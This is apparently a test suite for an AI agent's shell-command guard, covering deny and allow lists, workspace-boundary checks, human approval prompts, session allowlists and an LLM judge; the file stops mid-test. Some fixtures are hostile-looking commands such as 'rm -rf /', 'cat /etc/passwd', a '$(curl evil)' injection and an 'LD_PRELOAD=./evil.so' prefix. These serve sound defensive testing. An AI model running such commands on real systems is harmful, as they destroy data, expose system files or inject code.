import { describe, it, expect } from "bun:test";
import { isAbsolute, relative, resolve } from "node:path";
import {
  analyzeShell,
  type ShellFacts,
  type GuardContext,
  type GuardDecision,
} from "@clarvis/tools/guard";
import type {
  Elicit,
  ElicitRequest,
  LLMProvider,
  Logger,
  RunCapabilityContext,
} from "@clarvis/loop";
import { createShellGuard } from "../../src/guard/shell-guard.ts";
import {
  createGuardElicit,
  createGuardSessionAllowlist,
  type GuardElicitParams,
  type GuardSessionAllowlist,
} from "../../src/guard/guard-elicit.ts";
import { createJudgeElicit } from "../../src/guard/judge.ts";
import { createGuardResolver, resolveGuardMode } from "../../src/guard/resolver.ts";

const ROOT = resolve("/tmp/clarvis-kernel-guard-ws");

interface ShellFactOptions {
  paths?: string[];
  undecidable?: boolean;
  envAssignments?: string[][];
}

/** Author analyzer output directly: kernel policy consumes facts, not shell text. */
function shellFacts(normalized: string | string[], opts: ShellFactOptions = {}): ShellFacts {
  const values = Array.isArray(normalized) ? normalized : [normalized];
  return {
    paths: opts.paths ?? [],
    undecidable: opts.undecidable ?? false,
    segments: values.map((value, index) => ({
      command: value.split(" ")[0] ?? "",
      argv: [],
      normalized: value,
      envAssignments: opts.envAssignments?.[index] ?? [],
      decidable: !(opts.undecidable ?? false),
    })),
  };
}

function isWithinRoot(raw: string): boolean {
  const rel = relative(ROOT, resolve(ROOT, raw));
  return rel === "" || (!rel.startsWith("..") && !isAbsolute(rel));
}

function bashReq(command: string, shell: ShellFacts = shellFacts(command)): ElicitRequest {
  return { tool: "shell", args: { command }, shell };
}

function makeCtx(tool: string, args: Record<string, unknown>, supplied?: ShellFacts): GuardContext {
  const paths: GuardContext["paths"] = [];
  let shell: GuardContext["shell"];
  if ((tool === "shell" || tool === "monitor_start") && typeof args.command === "string") {
    shell = supplied ?? shellFacts(args.command);
    for (const raw of shell.paths) {
      paths.push({ raw, resolved: resolve(ROOT, raw), withinWorkspace: isWithinRoot(raw) });
    }
  }
  const sandboxPermissions =
    args.sandbox_permissions === "require_escalated" || args.sandbox_permissions === "use_default"
      ? args.sandbox_permissions
      : undefined;
  const justification = typeof args.justification === "string" ? args.justification : undefined;
  return {
    tool,
    args,
    config: { workspaceRoot: ROOT } as unknown as GuardContext["config"],
    paths,
    shell,
    ...(sandboxPermissions !== undefined ? { sandboxPermissions } : {}),
    ...(justification !== undefined ? { justification } : {}),
  };
}

describe("createShellGuard (kernel copy)", () => {
  it("forces a human for require_escalated when Isolation is Sandbox", async () => {
    const context = makeCtx("shell", {
      command: "bun test",
      sandbox_permissions: "require_escalated",
      justification: "need host docker.sock",
    });
    context.config = {
      ...context.config,
      sandbox: { type: "native" },
    } as GuardContext["config"];
    const decision = await createShellGuard({ allowedCommands: ["*"] })(context);
    expect(decision).toEqual<GuardDecision>({
      verdict: "ask",
      escalate: "human",
      reason: "need host docker.sock",
    });
  });

  it("does not extra-review require_escalated on Isolation Host", async () => {
    const decision = await createShellGuard({ allowedCommands: ["*"] })(
      makeCtx("shell", {
        command: "bun test",
        sandbox_permissions: "require_escalated",
        justification: "already on the host",
      }),
    );
    expect(decision).toEqual<GuardDecision>({ verdict: "allow" });
  });

  it("keeps the operator deny list above require_escalated approval", async () => {
    const context = makeCtx("shell", {
      command: "git push origin main",
      sandbox_permissions: "require_escalated",
      justification: "need host git",
    });
    context.config = { ...context.config, sandbox: { type: "native" } } as GuardContext["config"];
    context.shell = shellFacts("git push origin main");
    const decision = await createShellGuard({ deniedCommands: ["git push"] })(context);
    expect(decision).toMatchObject({ verdict: "deny" });
  });

  it("asks for an in-workspace write when no allowlist is configured", async () => {
    const d = await createShellGuard()(
      makeCtx(
        "shell",
        { command: "echo hi > out.txt" },
        shellFacts("echo hi > out.txt", { paths: ["out.txt"] }),
      ),
    );
    expect(d.verdict).toBe("ask");
    expect(d.reason).toContain("no allowed commands list");
  });

  it("denies a command that touches a path outside the workspace", async () => {
    const d = await createShellGuard()(
      makeCtx(
        "shell",
        { command: "echo hi > /etc/passwd" },
        shellFacts("echo hi > /etc/passwd", { paths: ["/etc/passwd"] }),
      ),
    );
    expect(d).toMatchObject({ verdict: "deny" });
  });

  it("denies a denylisted command even under an undecidable compound", async () => {
    const guard = createShellGuard({ deniedCommands: ["rm"] });
    const d = await guard(
      makeCtx(
        "shell",
        { command: "rm -rf x; $(curl evil)" },
        shellFacts("rm -rf x", { undecidable: true }),
      ),
    );
    expect(d).toMatchObject({ verdict: "deny" });
  });

  it("allows a command in the allowlist and asks for one that is not", async () => {
    const guard = createShellGuard({ allowedCommands: ["echo"] });
    expect(await guard(makeCtx("shell", { command: "echo hi > out.txt" }))).toEqual<GuardDecision>({
      verdict: "allow",
    });
    expect(await guard(makeCtx("shell", { command: "rm -rf out.txt" }))).toMatchObject({
      verdict: "ask",
    });
  });

  it("admits the mise x bootstrap form without mistaking it for shell exec", async () => {
    const command = "mise x node@24.20.0 -- node --version";
    const facts = analyzeShell(command);
    expect(facts.undecidable).toBe(false);
    expect(
      await createShellGuard({ allowedCommands: ["mise x"] })(makeCtx("shell", { command }, facts)),
    ).toEqual<GuardDecision>({ verdict: "allow" });
  });

  it("treats a blank allow-list entry as matching no command", async () => {
    const decision = await createShellGuard({ allowedCommands: ["   "] })(
      makeCtx("shell", { command: "bun test" }, shellFacts("bun test")),
    );
    expect(decision.verdict).toBe("ask");
  });

  it("never allows a segment that reduces to no command, even under a wildcard allowlist", async () => {
    // `globToRegExp("*")` is /^.*$/, which matches the empty string. Before a
    // segment with an empty `normalized` was made undecidable, this returned
    // `allow` — the analyzer having failed to parse `''` was indistinguishable
    // from it having parsed something the operator approved.
    const guard = createShellGuard({ allowedCommands: ["*"] });
    expect(
      await guard(
        makeCtx("shell", { command: "ls && ''" }, shellFacts(["ls", ""], { undecidable: true })),
      ),
    ).toMatchObject({ verdict: "ask" });
    expect(await guard(makeCtx("shell", { command: "ls" }))).toMatchObject({ verdict: "allow" });
  });
});

describe("createShellGuard — precedence order", () => {
  // The guard's order is load-bearing and nothing else pins it as an order.
  // Each case below is chosen so that exactly one swap of adjacent rules would
  // change its verdict.
  it("puts the deny list ahead of the undecidable check", async () => {
    const guard = createShellGuard({ deniedCommands: ["rm"] });
    expect(
      await guard(
        makeCtx(
          "shell",
          { command: "rm -rf x; $(curl evil)" },
          shellFacts("rm -rf x", { undecidable: true }),
        ),
      ),
    ).toMatchObject({ verdict: "deny" });
  });

  it("puts the deny list ahead of the outside-workspace check", async () => {
    const guard = createShellGuard({ deniedCommands: ["cat"] });
    const d = await guard(
      makeCtx(
        "shell",
        { command: "cat /etc/passwd" },
        shellFacts("cat /etc/passwd", { paths: ["/etc/passwd"] }),
      ),
    );
    expect(d).toMatchObject({ verdict: "deny" });
    expect(d.reason).toContain("denied commands list");
  });

  it("puts the undecidable check ahead of the outside-workspace check", async () => {
    const d = await createShellGuard()(
      makeCtx(
        "shell",
        { command: "cat $(x) /etc/passwd" },
        shellFacts("cat /etc/passwd", { paths: ["/etc/passwd"], undecidable: true }),
      ),
    );
    expect(d).toMatchObject({ verdict: "ask" });
    expect(d.reason).toContain("cannot be analyzed");
  });

  it("puts the outside-workspace check ahead of the allow list", async () => {
    const guard = createShellGuard({ allowedCommands: ["cat"] });
    expect(
      await guard(
        makeCtx(
          "shell",
          { command: "cat /etc/passwd" },
          shellFacts("cat /etc/passwd", { paths: ["/etc/passwd"] }),
        ),
      ),
    ).toMatchObject({ verdict: "deny" });
  });

  it("allows a call carrying no shell facts at all", async () => {
    const guard = createShellGuard({ allowedCommands: ["echo"] });
    expect(await guard(makeCtx("read_file", { path: "a.ts" }))).toEqual<GuardDecision>({
      verdict: "allow",
    });
  });
});

describe("resolveGuardMode", () => {
  it("takes the run param over settings, else the settings-derived default", () => {
    expect(resolveGuardMode("off", { type: "shell", mode: "on" })).toBe("off");
    expect(resolveGuardMode(undefined, { type: "shell", mode: "on" })).toBe("on");
    expect(resolveGuardMode(undefined, { type: "shell", allowed_commands: ["echo"] })).toBe("on");
  });

  // The posture, not a detail: an absent guard block means unconfigured, and an
  // unconfigured host still gets the guard. Only an explicit, persisted "off"
  // disarms it — a deleted block would be silently re-armed and is therefore
  // not an opt-out anyone could rely on.
  it("defaults an unconfigured host to 'on', and honours only an explicit off", () => {
    expect(resolveGuardMode(undefined, undefined)).toBe("on");
    expect(resolveGuardMode(undefined, { type: "shell" })).toBe("on");
    expect(resolveGuardMode(undefined, { type: "shell", mode: "off" })).toBe("off");
    expect(resolveGuardMode("off", undefined)).toBe("off");
  });
});

describe("createGuardElicit", () => {
  it("maps an accept+allow answer to true and anything else to false", async () => {
    const req = { tool: "shell", args: {}, reason: "confirm" } as unknown as ElicitRequest;

    const allow: Elicit = async () => ({ action: "accept", content: { decision: "allow" } });
    expect(await createGuardElicit(allow)(req)).toBe(true);

    const denyContent: Elicit = async () => ({ action: "accept", content: { decision: "deny" } });
    expect(await createGuardElicit(denyContent)(req)).toBe(false);

    const declined: Elicit = async () => ({ action: "decline" });
    expect(await createGuardElicit(declined)(req)).toBe(false);
  });

  it("declares a terminating wait bound to the backend, at setTimeout's own ceiling", async () => {
    const req = { tool: "shell", args: {}, reason: "confirm" } as unknown as ElicitRequest;
    let seen: number | undefined;
    const capture: Elicit = async (_params, opts) => {
      seen = opts?.timeoutMs;
      return { action: "accept", content: { decision: "allow" } };
    };

    await createGuardElicit(capture)(req);

    expect(seen).toBe(2_147_483_647);
    expect(seen).toBe(2 ** 31 - 1);
    expect(Number.isFinite(seen)).toBe(true);
  });

  it("shows the literal command and tags the elicit as a guard confirmation", async () => {
    const req = {
      tool: "shell",
      args: { command: "rm -rf build" },
      reason: "no allowed commands list configured",
      shell: { segments: [{ normalized: "rm" }], undecidable: false },
    } as unknown as ElicitRequest;

    let seen: { message: string; kind?: string } | undefined;
    const capture: Elicit = async (params) => {
      seen = { message: params.message, kind: params.kind };
      return { action: "accept", content: { decision: "allow" } };
    };
    await createGuardElicit(capture)(req);
    expect(seen?.kind).toBe("guard_confirm");
    expect(seen?.message).toContain("rm -rf build");
    expect(seen?.message).toContain("no allowed commands list configured");
  });

  it("shows normalized command segments when the raw command is unavailable", async () => {
    let message = "";
    const capture: Elicit = async (params) => {
      message = params.message;
      return { action: "decline" };
    };

    await createGuardElicit(capture)({
      tool: "shell",
      args: {},
      shell: shellFacts(["printf hello", "wc -c"]),
    });

    expect(message).toContain("Command segments: printf hello, wc -c");
  });

  it("passes command, cwd and the guard's reason as structured detail so clients never parse the message", async () => {
    const seen: GuardElicitParams[] = [];
    const capture: Elicit = async (params) => {
      seen.push(params);
      return { action: "accept", content: { decision: "allow" } };
    };
    const guarded = createGuardElicit(capture, { workspaceRoot: ROOT });
    await guarded({
      tool: "shell",
      args: { command: "rm -rf build", cwd: "sub" },
      reason: "no allowed commands list configured",
    });
    await guarded(bashReq("rm -rf build"));
    expect(seen[0]?.detail).toEqual({
      command: "rm -rf build",
      cwd: resolve(ROOT, "sub"),
      reason: "no allowed commands list configured",
    });
    expect(seen[1]?.detail).toEqual({
      command: "rm -rf build",
      cwd: ROOT,
      reason: 'Tool "shell" requires confirmation.',
    });
  });

  it("carries the undecidable-expansions warning on the detail, where the prose is not rendered", async () => {
    const seen: GuardElicitParams[] = [];
    const capture: Elicit = async (params) => {
      seen.push(params);
      return { action: "accept", content: { decision: "deny" } };
    };
    await createGuardElicit(capture, { workspaceRoot: ROOT })(
      bashReq("echo $(whoami)", shellFacts("echo", { undecidable: true })),
    );
    expect(seen[0]?.detail?.warning).toContain("undecidable expansions");
    expect(seen[0]?.message).toContain("undecidable expansions");
  });

  it("offers allow_session only for fully analyzable commands, with deny always first", async () => {
    const enums: (string[] | undefined)[] = [];
    const capture: Elicit = async (params) => {
      enums.push(params.requestedSchema.properties.decision?.enum);
      return { action: "accept", content: { decision: "deny" } };
    };
    const allowlist = createGuardSessionAllowlist();
    const guarded = createGuardElicit(capture, { allowlist });
    await guarded(bashReq("git status"));
    await guarded(bashReq("echo $(whoami)", shellFacts("echo", { undecidable: true })));
    await guarded({ tool: "write_file", args: {} });
    expect(enums[0]).toEqual(["deny", "allow", "allow_session"]);
    expect(enums[1]).toEqual(["deny", "allow"]);
    expect(enums[2]).toEqual(["deny", "allow"]);
  });

  it("records every approved segment on allow_session, matched exactly and never by prefix", async () => {
    const allowlist = createGuardSessionAllowlist();
    const acceptSession: Elicit = async () => ({
      action: "accept",
      content: { decision: "allow_session" },
    });
    const guarded = createGuardElicit(acceptSession, { allowlist });
    expect(
      await guarded(bashReq("git status && git diff", shellFacts(["git status", "git diff"]))),
    ).toBe(true);
    expect(allowlist.covers(shellFacts("git diff"))).toBe(true);
    expect(allowlist.covers(shellFacts("git diff --stat"))).toBe(false);
    expect(allowlist.covers(shellFacts("git"))).toBe(false);
  });

  it("keeps env assignments in the session key: an env-prefixed grant never leaks either way", async () => {
    const allowlist = createGuardSessionAllowlist();
    const acceptSession: Elicit = async () => ({
      action: "accept",
      content: { decision: "allow_session" },
    });
    const guarded = createGuardElicit(acceptSession, { allowlist });
    const fooOne = shellFacts("bun test", { envAssignments: [["FOO=1"]] });
    expect(await guarded(bashReq("FOO=1 bun test", fooOne))).toBe(true);
    expect(allowlist.covers(fooOne)).toBe(true);
    expect(allowlist.covers(shellFacts("bun test"))).toBe(false);
    expect(allowlist.covers(shellFacts("bun test", { envAssignments: [["FOO=2"]] }))).toBe(false);
  });

  it("denies an allow_session answer that was never offered and records nothing", async () => {
    const allowlist = createGuardSessionAllowlist();
    const acceptSession: Elicit = async () => ({
      action: "accept",
      content: { decision: "allow_session" },
    });
    expect(
      await createGuardElicit(acceptSession, { allowlist })(
        bashReq("echo $(whoami)", shellFacts("echo", { undecidable: true })),
      ),
    ).toBe(false);
    expect(allowlist.covers(shellFacts("echo"))).toBe(false);
  });
});

describe("createJudgeElicit", () => {
  it("degrades (returns undefined) when no judge model can be resolved", () => {
    const llm = { call: async () => ({}) } as unknown as LLMProvider;
    const judge = createJudgeElicit(
      { llm, providers: [], defaultModel: undefined },
      { prompt: "you are a judge" },
      undefined,
    );
    expect(judge).toBeUndefined();
  });

  it("returns the judge's allow verdict and memoizes per command", async () => {
    let calls = 0;
    const llm = {
      call: async () => {
        calls++;
        return { toolCalls: [{ name: "decide", arguments: { decision: "allow" } }] };
      },
    } as unknown as LLMProvider;
    const judge = createJudgeElicit(
      {
        llm,
        providers: [{ name: "anthropic", kind: "anthropic" }],
        defaultModel: "anthropic/claude-x",
      },
      { prompt: "judge" },
      undefined,
    )!;
    const req = {
      tool: "shell",
      args: { command: "echo hi" },
      shell: shellFacts("echo hi"),
    } as unknown as ElicitRequest;
    expect(await judge(req)).toEqual({ allowed: true, answerer: "judge" });
    expect(await judge(req)).toEqual({ allowed: true, answerer: "judge" });
    expect(calls).toBe(1);
  });

  it("returns the judge's deny verdict", async () => {
    const llm = {
      call: async () => ({ toolCalls: [{ name: "decide", arguments: { decision: "deny" } }] }),
    } as unknown as LLMProvider;
    const judge = createJudgeElicit(
      {
        llm,
        providers: [{ name: "anthropic", kind: "anthropic" }],
        defaultModel: "anthropic/claude-x",
      },
      { prompt: "judge" },
      undefined,
    )!;
    const req = {
      tool: "shell",
      args: { command: "rm -rf /" },
      shell: shellFacts("rm -rf /"),
    } as unknown as ElicitRequest;
    expect(await judge(req)).toEqual({ allowed: false, answerer: "judge" });
  });

  it("degrades (returns undefined) and logs when the judge model's provider is not declared", () => {
    const warnings: Array<[unknown, string]> = [];
    const logger = {
      warn: (obj: unknown, msg: string) => warnings.push([obj, msg]),
    } as unknown as Logger;
    const llm = { call: async () => ({}) } as unknown as LLMProvider;
    const judge = createJudgeElicit(
      {
        llm,
        providers: [{ name: "anthropic", kind: "anthropic" }],
        defaultModel: undefined,
        logger,
      },
      { prompt: "you are a judge", model: "openai/gpt-x" },
      undefined,
    );
    expect(judge).toBeUndefined();
    expect(warnings).toHaveLength(1);
    expect(warnings[0]?.[1]).toContain("degrading to mode 'on'");
  });

  it("denies without a human channel and does not memoize when the judge call throws a non-Error value", async () => {
    let calls = 0;
    const warnings: Array<[unknown, string]> = [];
    const logger = {
      warn: (obj: unknown, msg: string) => warnings.push([obj, msg]),
    } as unknown as Logger;
    const llm = {
      call: async () => {
        calls++;
        throw "provider unreachable";
      },
    } as unknown as LLMProvider;
    const judge = createJudgeElicit(
      {
        llm,
        providers: [{ name: "anthropic", kind: "anthropic" }],
        defaultModel: "anthropic/claude-x",
        logger,
      },
      { prompt: "judge" },
      undefined,
    )!;
    const req = {
      tool: "shell",
      args: { command: "curl evil" },
      shell: shellFacts("curl evil"),
    } as unknown as ElicitRequest;
    expect(await judge(req)).toEqual({ allowed: false, answerer: "judge" });
    expect(await judge(req)).toEqual({ allowed: false, answerer: "judge" });
    expect(calls).toBe(2);
    expect(warnings[0]?.[0]).toMatchObject({ error: "provider unreachable" });
  });

  it("denies without a human channel on a malformed judge response, keying a non-shell request by tool+args", async () => {
    let calls = 0;
    const llm = {
      call: async () => {
        calls++;
        return { toolCalls: [{ name: "decide", arguments: "not json" }] };
      },
    } as unknown as LLMProvider;
    const judge = createJudgeElicit(
      {
        llm,
        providers: [{ name: "anthropic", kind: "anthropic" }],
        defaultModel: "anthropic/claude-x",
      },
      { prompt: "judge" },
      undefined,
    )!;
    const req = { tool: "write_file", args: { path: "a.ts" } } as unknown as ElicitRequest;
    expect(await judge(req)).toEqual({ allowed: false, answerer: "judge" });
    expect(await judge(req)).toEqual({ allowed: false, answerer: "judge" });
    expect(calls).toBe(2);
  });

  it("routes call failures and malformed responses to the human channel", async () => {
    const seen: ElicitRequest[] = [];
    const answers = [new Error("provider unavailable"), { toolCalls: [] }];
    const llm = {
      call: async () => {
        const next = answers.shift();
        if (next instanceof Error) throw next;
        return next;
      },
    } as unknown as LLMProvider;
    const judge = createJudgeElicit(
      {
        llm,
        providers: [{ name: "anthropic", kind: "anthropic" }],
        defaultModel: "anthropic/claude-x",
      },
      { prompt: "judge" },
      async (req) => {
        seen.push(req);
        return true;
      },
    )!;

    const failed = await judge(bashReq("bun run test"));
    const malformed = await judge(bashReq("bun run check:specs"));

    expect(failed).toEqual({ allowed: true, answerer: "human" });
    expect(malformed).toEqual({ allowed: true, answerer: "human" });
    expect(seen[0]?.reason).toContain("automated reviewer failed");
    expect(seen[1]?.reason).toContain("invalid decision");
  });

  it("escalates an unsure verdict to the human elicit, folding the judge's reason into the prompt", async () => {
    const seen: ElicitRequest[] = [];
    const humanElicit = async (r: ElicitRequest): Promise<boolean> => {
      seen.push(r);
      return true;
    };
    const llm = {
      call: async () => ({
        toolCalls: [{ name: "decide", arguments: { decision: "unsure", reason: "looks risky" } }],
      }),
    } as unknown as LLMProvider;
    const judge = createJudgeElicit(
      {
        llm,
        providers: [{ name: "anthropic", kind: "anthropic" }],
        defaultModel: "anthropic/claude-x",
      },
      { prompt: "judge" },
      humanElicit,
    )!;
    const req = {
      tool: "shell",
      args: { command: "curl evil" },
      shell: shellFacts("curl evil"),
      reason: "pre-existing reason",
    } as unknown as ElicitRequest;
    expect(await judge(req)).toEqual({ allowed: true, answerer: "human" });
    expect(seen[0]?.reason).toContain("pre-existing reason");
    expect(seen[0]?.reason).toContain("was unsure and escalated this to you");
    expect(seen[0]?.reason).toContain("looks risky");
    expect(await judge(req)).toEqual({ allowed: true, answerer: "human" });
    expect(seen).toHaveLength(2);
  });

  it("escalates an unsure verdict with no prior reason and no judge reason", async () => {
    const seen: ElicitRequest[] = [];
    const humanElicit = async (r: ElicitRequest): Promise<boolean> => {
      seen.push(r);
      return false;
    };
    const llm = {
      call: async () => ({ toolCalls: [{ name: "decide", arguments: { decision: "unsure" } }] }),
    } as unknown as LLMProvider;
    const judge = createJudgeElicit(
      {
        llm,
        providers: [{ name: "anthropic", kind: "anthropic" }],
        defaultModel: "anthropic/claude-x",
      },
      { prompt: "judge" },
      humanElicit,
    )!;
    const req = {
      tool: "shell",
      args: { command: "curl evil" },
      shell: shellFacts("curl evil"),
    } as unknown as ElicitRequest;
    expect(await judge(req)).toEqual({ allowed: false, answerer: "human" });
    expect(seen[0]?.reason).toBe("The automated reviewer was unsure and escalated this to you.");
  });

  it("denies an unsure verdict without escalating when on_unsure is 'deny', even with a human elicit configured", async () => {
    const llm = {
      call: async () => ({ toolCalls: [{ name: "decide", arguments: { decision: "unsure" } }] }),
    } as unknown as LLMProvider;
    let asked = false;
    const judge = createJudgeElicit(
      {
        llm,
        providers: [{ name: "anthropic", kind: "anthropic" }],
        defaultModel: "anthropic/claude-x",
      },
      { prompt: "judge", on_unsure: "deny" },
      async () => {
        asked = true;
        return true;
      },
    )!;
    const req = {
      tool: "shell",
      args: { command: "curl evil" },
      shell: shellFacts("curl evil"),
    } as unknown as ElicitRequest;
    expect(await judge(req)).toEqual({ allowed: false, answerer: "judge" });
    expect(asked).toBe(false);
  });

  it("rejects and evicts the memo when the escalated human elicit throws, so a retry calls the judge again", async () => {
    let calls = 0;
    const llm = {
      call: async () => {
        calls++;
        return { toolCalls: [{ name: "decide", arguments: { decision: "unsure" } }] };
      },
    } as unknown as LLMProvider;
    const humanElicit = async (): Promise<boolean> => {
      throw new Error("human elicit boom");
    };
    const judge = createJudgeElicit(
      {
        llm,
        providers: [{ name: "anthropic", kind: "anthropic" }],
        defaultModel: "anthropic/claude-x",
      },
      { prompt: "judge" },
      humanElicit,
    )!;
    const req = {
      tool: "shell",
      args: { command: "curl evil" },
      shell: shellFacts("curl evil"),
    } as unknown as ElicitRequest;
    await expect(judge(req)).rejects.toThrow("human elicit boom");
    await expect(judge(req)).rejects.toThrow("human elicit boom");
    expect(calls).toBe(2);
  });
});

describe("createGuardResolver", () => {
  function ctx(over: Partial<RunCapabilityContext>): RunCapabilityContext {
    return {
      owner: "o",
      request: { guard_mode: "on" },
      entryGrants: [],
      env: {},
      workspaceRoot: ROOT,
      llm: { call: async () => ({}) },
      emit: () => {},
      ...over,
    } as unknown as RunCapabilityContext;
  }

  it("returns undefined (unguarded) when the effective mode is off", () => {
    const resolve = createGuardResolver({
      loadSettings: () => ({ guard: { type: "shell", mode: "off" } }),
    });
    expect(resolve(ctx({ request: { guard_mode: undefined } as never }))).toBeUndefined();
  });

  it("returns a guard plus the human elicit channel in mode on", async () => {
    let asked = false;
    const elicit: Elicit = async () => {
      asked = true;
      return { action: "accept", content: { decision: "allow" } };
    };
    const resolver = createGuardResolver({ loadSettings: () => ({}) });
    const resolution = await resolver(ctx({ request: { guard_mode: "on" } as never, elicit }));
    expect(resolution?.guard).toBeDefined();
    expect(resolution?.elicit).toBeDefined();
    const ok = await resolution!.elicit!({ tool: "shell", args: {} } as unknown as ElicitRequest);
    expect(asked).toBe(true);
    expect(ok).toEqual({ allowed: true, answerer: "human" });
  });

  function countingElicit(decision: string): { elicit: Elicit; prompts: () => number } {
    let prompts = 0;
    const elicit: Elicit = async () => {
      prompts++;
      return { action: "accept", content: { decision } };
    };
    return { elicit, prompts: () => prompts };
  }

  it("revalidates the live controller's allowlist inside an already resolved run", async () => {
    let current: GuardSessionAllowlist | undefined = createGuardSessionAllowlist();
    const { elicit, prompts } = countingElicit("allow_session");
    const resolver = createGuardResolver({
      loadSettings: () => ({}),
      sessionAllowlistFor: ({ owner, executionId }) => {
        expect(owner).toBe("o");
        expect(executionId).toBe("hosted-run");
        return current;
      },
    });
    const resolution = await resolver(ctx({ executionId: "hosted-run", elicit }));
    const ask = () => resolution!.elicit!(bashReq("bun test"));
    expect(await ask()).toEqual({ allowed: true, answerer: "human" });
    expect(await ask()).toEqual({ allowed: true, answerer: "session_allowlist" });
    current.revoke();
    current = undefined;
    expect(await ask()).toEqual({ allowed: false, answerer: "human" });
    current = createGuardSessionAllowlist();
    expect(await ask()).toEqual({ allowed: true, answerer: "human" });
    expect(prompts()).toBe(3);
  });

  it.each(["allow", "allow_session"])(
    "refuses a retired controller's pending %s answer",
    async (decision) => {
      const old = createGuardSessionAllowlist();
      let current = old;
      const pending = Promise.withResolvers<Awaited<ReturnType<Elicit>>>();
      const resolver = createGuardResolver({
        loadSettings: () => ({}),
        sessionAllowlistFor: () => current,
      });
      const resolution = await resolver(ctx({ elicit: () => pending.promise }));
      const answer = resolution!.elicit!(bashReq("bun test"));
      old.revoke();
      current = createGuardSessionAllowlist();
      pending.resolve({ action: "accept", content: { decision } });
      expect(await answer).toEqual({ allowed: false, answerer: "human" });
      expect(old.covers(shellFacts("bun test"))).toBe(false);
      expect(current.covers(shellFacts("bun test"))).toBe(false);
    },
  );

  it("bounds retained command approvals and never revives a revoked list", () => {
    const list = createGuardSessionAllowlist();
    for (let index = 0; index < 1024; index++) list.record(shellFacts(`echo ${index}`));
    list.record(shellFacts("echo overflow"));
    expect(list.covers(shellFacts("echo 0"))).toBe(true);
    expect(list.covers(shellFacts("echo overflow"))).toBe(false);
    const large = createGuardSessionAllowlist();
    const oversized = shellFacts(`echo ${"x".repeat(1024 * 1024)}`);
    large.record(oversized);
    expect(large.covers(oversized)).toBe(false);
    large.record(shellFacts("echo x"));
    expect(large.covers(shellFacts("echo x"))).toBe(true);
    list.revoke();
    list.record(shellFacts("echo 0"));
    expect(list.covers(shellFacts("echo 0"))).toBe(false);
  });

  it("allow_session silences the next prompt for the same command across runs, new flags ask again", async () => {
    const { elicit, prompts } = countingElicit("allow_session");
    const resolver = createGuardResolver({ loadSettings: () => ({}) });
    const first = await resolver(ctx({ request: { guard_mode: "on" } as never, elicit }));
    expect(await first!.elicit!(bashReq("bun test"))).toEqual({
      allowed: true,
      answerer: "human",
    });
    expect(prompts()).toBe(1);

    const second = await resolver(ctx({ request: { guard_mode: "on" } as never, elicit }));
    expect(await second!.elicit!(bashReq("bun test"))).toEqual({
      allowed: true,
      answerer: "session_allowlist",
    });
    expect(prompts()).toBe(1);

    expect(await second!.elicit!(bashReq("bun test --watch"))).toEqual({
      allowed: true,
      answerer: "human",
    });
    expect(prompts()).toBe(2);
  });

  it("matches session approvals on normalized text, but an env assignment never rides a grant", async () => {
    const { elicit, prompts } = countingElicit("allow_session");
    const resolver = createGuardResolver({ loadSettings: () => ({}) });
    const resolution = await resolver(ctx({ request: { guard_mode: "on" } as never, elicit }));
    expect(await resolution!.elicit!(bashReq("bun   test", shellFacts("bun test")))).toEqual({
      allowed: true,
      answerer: "human",
    });
    expect(await resolution!.elicit!(bashReq("bun test"))).toEqual({
      allowed: true,
      answerer: "session_allowlist",
    });
    expect(prompts()).toBe(1);
    expect(
      await resolution!.elicit!(
        bashReq(
          "LD_PRELOAD=./evil.so bun test",
          shellFacts("bun test", { envAssignments: [["LD_PRELOAD=./evil.so"]] }),
        ),
      ),
    ).toEqual({ allowed: true, answerer: "human" });
    expect(prompts()).toBe(2);
  });

  it("a plain allow answers once and leaves the session allowlist untouched", async () => {
    const { elicit, prompts } = countingElicit("allow");
    const resolver = createGuardResolver({ loadSettings: () => ({}) });
    const resolution = await resolver(ctx({ request: { guard_mode: "on" } as never, elicit }));
    expect(await resolution!.elicit!(bashReq("bun test"))).toEqual({
      allowed: true,
      answerer: "human",
    });
    expect(await resolution!.elicit!(bashReq("bun test"))).toEqual({
      allowed: true,
      answerer: "human",
    });
    expect(prompts()).toBe(2);
  });

  it("keeps a channel-less resolution elicit-less even after a session approval", async () => {
    const { elicit } = countingElicit("allow_session");
    const resolver = createGuardResolver({ loadSettings: () => ({}) });
    const interactive = await resolver(ctx({ request: { guard_mode: "on" } as never, elicit }));
    expect(await interactive!.elicit!(bashReq("bun test"))).toEqual({
      allowed: true,
      answerer: "human",
    });

    const headless = await resolver(ctx({ request: { guard_mode: "on" } as never }));
    expect(headless?.guard).toBeDefined();
    expect(headless?.elicit).toBeUndefined();
  });

  it("auto-declined confirmations (headless -p) deny every time and record nothing", async () => {
    let prompts = 0;
    const decline: Elicit = async () => {
      prompts++;
      return { action: "decline" };
    };
    const resolver = createGuardResolver({ loadSettings: () => ({}) });
    const resolution = await resolver(
      ctx({ request: { guard_mode: "on" } as never, elicit: decline }),
    );
    expect(await resolution!.elicit!(bashReq("bun test"))).toEqual({
      allowed: false,
      answerer: "human",
    });
    expect(await resolution!.elicit!(bashReq("bun test"))).toEqual({
      allowed: false,
      answerer: "human",
    });
    expect(prompts).toBe(2);
  });

  it("in mode auto, uses the LLM judge (never prompting the human) when guard_judge is set and a model resolves", async () => {
    let asked = false;
    const humanElicit: Elicit = async () => {
      asked = true;
      return { action: "accept", content: { decision: "allow" } };
    };
    const llm = {
      call: async () => ({ toolCalls: [{ name: "decide", arguments: { decision: "allow" } }] }),
    } as unknown as RunCapabilityContext["llm"];
    const resolver = createGuardResolver({
      loadSettings: () => ({
        providers: [{ name: "anthropic", kind: "anthropic" }],
        defaultModel: "anthropic/claude-x",
      }),
    });
    const resolution = await resolver(
      ctx({
        request: { guard_mode: "auto", guard_judge: { prompt: "judge" } } as never,
        elicit: humanElicit,
        llm,
      }),
    );
    expect(resolution?.elicit).toBeDefined();
    expect(await resolution!.elicit!(bashReq("echo hi"))).toEqual({
      allowed: true,
      answerer: "judge",
    });
    expect(
      await resolution!.elicit!({
        tool: "shell",
        args: { command: "bun test" },
        shell: shellFacts("bun test"),
      }),
    ).toEqual({ allowed: true, answerer: "judge" });
    expect(asked).toBe(false);
  });

  it("in mode auto, sends require_escalated host execution to a human, not the judge", async () => {
    let asked = false;
    let judged = false;
    const humanElicit: Elicit = async () => {
      asked = true;
      return { action: "accept", content: { decision: "allow" } };
    };
    const llm = {
      call: async () => {
        judged = true;
        return { toolCalls: [{ name: "decide", arguments: { decision: "allow" } }] };
      },
    } as unknown as RunCapabilityContext["llm"];
    const resolver = createGuardResolver({
      loadSettings: () => ({
        providers: [{ name: "anthropic", kind: "anthropic" }],
        defaultModel: "anthropic/claude-x",
      }),
    });
